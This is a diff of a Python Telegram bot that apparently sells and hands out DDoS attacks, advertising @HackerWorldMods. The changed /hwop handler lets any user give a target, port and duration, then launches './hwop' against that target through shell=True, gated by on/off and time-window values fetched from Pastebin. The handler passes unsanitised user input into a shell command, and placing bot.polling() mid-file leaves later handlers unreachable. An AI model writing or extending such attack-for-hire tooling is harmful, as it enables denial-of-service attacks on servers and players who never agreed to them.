@@ -264,7 +264,6 @@ def handle_bgmi(message):
     bot.reply_to(message, response)
 
 # Function to fetch the on/off value from Pastebin
-# Function to fetch the on/off value from Pastebin
 def fetch_on_off_value():
     try:
         response = requests.get(ON_OFF_PASTEBIN_URL)
@@ -296,56 +295,7 @@ def parse_time_range(time_range_str):
     except ValueError:
         return None, None
 
-# Handler for /hwop command
-@bot.message_handler(commands=['hwop'])
-def handle_hwop(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        if not fetch_on_off_value():
-            response = "The free command is off now. Check @HackerWorldMods for more updates."
-        else:
-            # Fetch and parse the allowed time range from Pastebin
-            time_range_str = fetch_time_range()
-            if time_range_str:
-                start_time, end_time = parse_time_range(time_range_str)
-                current_time = datetime.datetime.now().time()
-
-                if not (start_time <= current_time <= end_time):
-                    response = "Command time is changed join @HackerWorldMods for updates."
-                    bot.reply_to(message, response)
-                    return
-            else:
-                response = "Failed to fetch the time range. Please try again later."
-                bot.reply_to(message, response)
-                return
-
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You are on cooldown ❌. Please wait 45 minutes before running the /hwop command again."
-                bot.reply_to(message, response)
-                return
-            bgmi_cooldown[user_id] = datetime.datetime.now()
-
-            command = message.text.split()
-            if len(command) == 4:
-                target = command[1]
-                port = int(command[2])
-                time = int(command[3])
-                if time > 121:
-                    response = "Error: Time interval must be less than 120."
-                else:
-                    record_command_logs(user_id, '/hwop', target, port, time)
-                    log_command(user_id, target, port, time)
-                    start_attack_reply_hwop(message, target, port, time)
-                    full_command = f"./hwop {target} {port} {time} 800"
-                    subprocess.run(full_command, shell=True)
-                    response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
-            else:
-                response = "✅ Usage :- /hwop <target> <port> <time>"
-    else:
-        response = "Command time is changed join @HackerWorldMods for updates."
-    bot.reply_to(message, response)
-
-# Function to handle the reply when HWOP attack is started
+# Function to handle the reply when free users run the /hwop command
 def start_attack_reply_hwop(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
@@ -353,7 +303,47 @@ def start_attack_reply_hwop(message, target, port, time):
     response = f"{username}, 𝐇𝐖𝐎𝐏 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: HWOP"
     bot.reply_to(message, response)
 
-    
+# Dictionary to store the last time each user ran the /hwop command
+hwop_cooldown = {}
+
+COOLDOWN_TIME = 2700
+
+# Handler for /hwop command
+@bot.message_handler(commands=['hwop'])
+def handle_hwop(message):
+    user_id = str(message.chat.id)
+    if fetch_on_off_value():
+        if user_id in hwop_cooldown and (datetime.datetime.now() - hwop_cooldown[user_id]).seconds < COOLDOWN_TIME:
+            response = "You are on cooldown ❌. Please wait 45 minutes before running the /hwop command again."
+            bot.reply_to(message, response)
+            return
+        hwop_cooldown[user_id] = datetime.datetime.now()
+
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+            if time > 121:
+                response = "Error: Time interval must be less than 120."
+            else:
+                start_time, end_time = parse_time_range(fetch_time_range())
+                current_time = datetime.datetime.now().time()
+                if start_time <= current_time <= end_time:
+                    start_attack_reply_hwop(message, target, port, time)
+                    full_command = f"./hwop {target} {port} {time} 800"
+                    subprocess.run(full_command, shell=True)
+                    response = f"HWOP Attack Finished. Target: {target} Port: {port} Time: {time}"
+                else:
+                    response = "Command time is changed. Join @HackerWorldMods for updates."
+        else:
+            response = "✅ Usage :- /hwop <target> <port> <time>"
+    else:
+        response = "Command is off now. Check @HackerWorldMods for more updates."
+
+    bot.reply_to(message, response)
+
+bot.polling()
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
